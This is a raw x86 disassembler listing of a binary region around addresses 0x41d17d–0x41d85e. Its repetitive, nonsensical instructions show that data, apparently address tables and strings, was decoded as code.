  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dh
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dh
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
